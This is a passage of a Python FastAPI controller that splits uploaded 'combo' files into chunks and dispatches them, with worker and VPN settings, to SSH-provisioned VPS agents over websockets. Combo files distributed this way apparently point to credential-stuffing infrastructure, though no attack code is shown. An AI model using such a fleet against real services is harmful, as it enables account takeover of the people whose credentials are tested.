        stem = re.sub(r"[^A-Za-z0-9._-]+", "_", os.path.splitext(body.filename or "")[0]).strip("._-")[:40]
        job_id = f"job_{int(time.time())}_{secrets.token_hex(3)}"
        assigned_vps = [vid for vid in body.vps_ids if assignments.get(vid)]
        await db.create_job(
            job_id,
            body.mode,
            {
                "vps_ids": assigned_vps,
                "args": validated_args,
                "workers": w_val,
                "two_tab": body.two_tab,
                "filename": stem,
            },
        )
        job_dir = os.path.join(base_data, "jobs", job_id)
        os.makedirs(job_dir, exist_ok=True)
        queued = []
        has_w_arg = any(a in ("--workers", "-w") or a.startswith(("--workers=", "-w=")) for a in validated_args)
        has_tt_arg = any(a in ("--two-tab", "--no-two-tab") for a in validated_args)
        for vid in body.vps_ids:
            chunk = assignments.get(vid) or []
            if not chunk:
                continue
            with open(os.path.join(job_dir, f"{vid}.txt"), "w", encoding="utf-8") as f:
                f.write("\n".join(chunk) + "\n")
            args_list = list(validated_args)
            if not has_w_arg:
                args_list.extend(["--workers", w_val])
            if not has_tt_arg and body.two_tab is not None:
                args_list.append("--two-tab" if body.two_tab else "--no-two-tab")
            cmd = await _push_command_to_node(
                vid,
                "START",
                {
                    "job_id": job_id,
                    "combo_url": f"/api/v1/agent/combo/{job_id}/{vid}",
                    "sync_vpn": bool(body.distribute_vpn),
                    "args": args_list,
                },
            )
            queued.append(cmd)
        return {"ok": True, "job_id": job_id, "queued": queued}

    @app.get("/api/v1/agent/combo/{job_id}/{target_vps_id}")
    async def download_combo(job_id: str, target_vps_id: str, vps_id: str = Depends(require_agent_auth)):
        jid = _validate_safe_id(job_id, "job_id")
        if target_vps_id != vps_id:
            raise HTTPException(status_code=403, detail="Forbidden")
        fp = os.path.join(base_data, "jobs", jid, f"{vps_id}.txt")
        if not os.path.isfile(fp):
            raise HTTPException(status_code=404, detail="Combo chunk not found")
        return FileResponse(fp, media_type="text/plain; charset=utf-8")

    @app.post("/api/v1/vps/provision", dependencies=[Depends(require_ui_auth)])
    async def provision_vps(body: ProvisionBody, request: Request):
        vid = _validate_safe_id(body.vps_id, "vps_id")
        if body.mode != "bootstrap" and not body.host.strip():
            raise HTTPException(status_code=400, detail="Host/IP required for SSH provisioning")
        raw_token = secrets.token_urlsafe(32)
        induk_url = (body.induk_url or str(request.base_url)).rstrip("/")
        if body.mode == "bootstrap":
            try:
                script = render_bootstrap_script(
                    induk_url, vid, raw_token, body.repo_url, body.pointer_url, body.ufasproxy_url, body.ufasproxy_token
                )
            except ValueError as ve:
                raise HTTPException(status_code=400, detail=str(ve))
            await db.register_node(vid, body.name.strip() or vid, 4, raw_token)
            return {"ok": True, "vps_id": vid, "agent_token": raw_token, "bootstrap_script": script}

        async def _run_ssh_task() -> None:
            pre_created = [False]
            succeeded = [False]

            async def _emit(line: str) -> None:
                await hub.broadcast_ui({"type": "provision_log", "vps_id": vid, "line": line})

            async def _pre_register(os_tag: str, bench: dict) -> None:
                nodes_now, _ = await db.list_nodes(offline_after_s=offline_s, stall_after_s=stall_s)
                if not any(n["vps_id"] == vid for n in nodes_now):
                    pre_created[0] = True
                await db.register_node(
                    vid,
                    body.name.strip() or vid,
                    bench["recommended_workers"],
                    raw_token,
                    os_info=os_tag,
                    benchmark=bench,
                )

            try:
                await provision_via_ssh(
                    host=body.host.strip(),
                    port=body.port,
                    username=body.username.strip() or "root",
                    password=body.password or None,
                    private_key=body.private_key or None,
                    vps_id=vid,
                    token=raw_token,
                    induk_url=induk_url,
                    repo_url=body.repo_url,
                    pointer_url=body.pointer_url,
                    ufasproxy_url=body.ufasproxy_url,
                    ufasproxy_token=body.ufasproxy_token,
                    on_log=_emit,
                    on_ready=_pre_register,
                )
                succeeded[0] = True
                nodes, summary = await db.list_nodes(offline_after_s=offline_s, stall_after_s=stall_s)
                await hub.broadcast_ui({"type": "snapshot", "nodes": nodes, "summary": summary})
                await _emit(f"[{vid}] Ready")
            except UnsupportedOSError as oe:
                await _emit(f"[{vid}] ERROR: {oe}")
            except asyncio.CancelledError:
                raise
            except Exception as exc:
                await _emit(f"[{vid}] ERROR: {exc}")
            finally:
                if not succeeded[0] and pre_created[0]:
                    with contextlib.suppress(Exception):
                        await db.delete_node(vid)
                        nodes, summary = await db.list_nodes(offline_after_s=offline_s, stall_after_s=stall_s)
                        await hub.broadcast_ui({"type": "snapshot", "nodes": nodes, "summary": summary})

        task = asyncio.create_task(_run_ssh_task())
        ssh_tasks.add(task)
        task.add_done_callback(ssh_tasks.discard)
        return {"ok": True, "vps_id": vid, "agent_token": raw_token, "status": "PROVISIONING"}

    @app.get("/api/v1/system/backup", dependencies=[Depends(require_ui_auth)])
    async def download_backup():
        bundle = await export_induk_bundle(db, base_data)
        return Response(
            bundle,
            media_type="application/gzip",
            headers={"Content-Disposition": 'attachment; filename="induk-backup.tar.gz"'},
        )

    @app.post("/api/v1/system/restore", dependencies=[Depends(require_ui_auth)])
    async def upload_restore(bundle: UploadFile = File(...)):
        raw = await bundle.read()
        try:
            res = await restore_induk_bundle(raw, base_data, db)
        except ValueError as ve:
            raise HTTPException(status_code=400, detail=str(ve))
        nodes, summary = await db.list_nodes(offline_after_s=offline_s, stall_after_s=stall_s)
        await hub.broadcast_ui({"type": "snapshot", "nodes": nodes, "summary": summary})
        return res

    @app.post("/api/v1/system/migrate-induk", dependencies=[Depends(require_ui_auth)])
    async def migrate_induk(body: MigrateIndukBody):
        new_url = body.new_induk_url.strip().rstrip("/")
        if not new_url.startswith(("http://", "https://")):
            raise HTTPException(status_code=400, detail="new_induk_url must start with http:// or https://")
        targets = body.vps_ids
        if not targets:
            nodes, _ = await db.list_nodes(offline_after_s=offline_s, stall_after_s=stall_s)
            targets = [n["vps_id"] for n in nodes]
        queued = [await _push_command_to_node(vid, "SET_INDUK", {"new_induk_url": new_url}) for vid in targets]
        return {"ok": True, "new_induk_url": new_url, "queued": queued}

    static_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "static")
    if os.path.isdir(static_dir):
        app.mount("/static", StaticFiles(directory=static_dir), name="static")

        @app.get("/", include_in_schema=False)
        async def serve_index():
            return FileResponse(os.path.join(static_dir, "index.html"))

    @app.websocket("/ws/agent")
    async def ws_agent(ws: WebSocket):
        ip = ws.client.host if ws.client else "unknown"
        try:
            agent_limiter.check(ip)
        except HTTPException:
            await ws.close(code=4429)
            return
        tok = _bearer_token(ws.headers.get("authorization")) or ws.query_params.get("token", "")
        vps_id = await db.verify_agent_token(tok)
        if not vps_id:
            agent_limiter.record_fail(ip)
            await ws.close(code=4401)
            return
        agent_limiter.reset(ip)
        await ws.accept()
        old_ws = hub.agent_sockets.get(vps_id)
        if old_ws is not None and old_ws is not ws:
            with contextlib.suppress(Exception):
                await old_ws.close(code=4000)
        hub.agent_sockets[vps_id] = ws
        await db.touch_seen(vps_id, state="ONLINE")

        try:
            pending = await db.get_unacked_commands(vps_id)
            delivered_ids: list[str] = []
            for cmd in pending:
                await ws.send_json({"type": "command", "command": cmd})
                delivered_ids.append(cmd["cmd_id"])
            await db.mark_delivered(delivered_ids)

            nodes, summary = await db.list_nodes(offline_after_s=offline_s, stall_after_s=stall_s)
            await hub.broadcast_ui({"type": "snapshot", "nodes": nodes, "summary": summary})

            while True:
                data = await ws.receive_json()
                if not isinstance(data, dict):
                    continue
                mtype = str(data.get("type") or "")
                if mtype == "telemetry":
                    await db.update_telemetry(vps_id, data)
                    nodes, summary = await db.list_nodes(offline_after_s=offline_s, stall_after_s=stall_s)
                    await hub.broadcast_ui({"type": "snapshot", "nodes": nodes, "summary": summary})
                elif mtype == "cmd_ack":
                    cmd_id = str(data.get("cmd_id") or "")
                    ok = bool(data.get("ok", True))
                    msg = str(data.get("message") or "")
                    await db.ack_command(vps_id, cmd_id, ok=ok, message=msg)
                    await db.touch_seen(vps_id)
                    await hub.broadcast_ui({"type": "cmd_ack", "vps_id": vps_id, "cmd_id": cmd_id, "ok": ok, "message": msg})
                elif mtype == "ping":
                    await db.touch_seen(vps_id)
                    await ws.send_json({"type": "pong", "ts": time.time()})
        except (WebSocketDisconnect, Exception):
            pass
        finally:
            if hub.agent_sockets.get(vps_id) is ws:
                hub.agent_sockets.pop(vps_id, None)
            with contextlib.suppress(RuntimeError, Exception):
                nodes, summary = await db.list_nodes(offline_after_s=offline_s, stall_after_s=stall_s)
                await hub.broadcast_ui({"type": "snapshot", "nodes": nodes, "summary": summary})

    @app.websocket("/ws/ui")
    async def ws_ui(ws: WebSocket):
        ip = ws.client.host if ws.client else "unknown"
        try:
            limiter.check(ip)
        except HTTPException:
            await ws.close(code=4429)
            return
        ticket = ws.query_params.get("ticket", "")
        key = ws.headers.get("x-api-key") or ws.query_params.get("api_key", "")
        ticket_ok = bool(ticket and ws_tickets.pop(ticket, 0.0) > time.monotonic())
        key_ok = bool(resolved_key and key and hmac.compare_digest(key, resolved_key))
        if not (ticket_ok or key_ok):
            limiter.record_fail(ip)
            await ws.close(code=4401)
            return
        limiter.reset(ip)
        await ws.accept()
        hub.ui_sockets.add(ws)
        try:
            nodes, summary = await db.list_nodes(offline_after_s=offline_s, stall_after_s=stall_s)
            await ws.send_json({"type": "snapshot", "nodes": nodes, "summary": summary})
            while True:
                msg = await ws.receive_text()
                if msg == "ping":
                    await ws.send_json({"type": "pong"})
        except (WebSocketDisconnect, Exception):
            pass
        finally:
            hub.ui_sockets.discard(ws)

    return app


app = create_app()
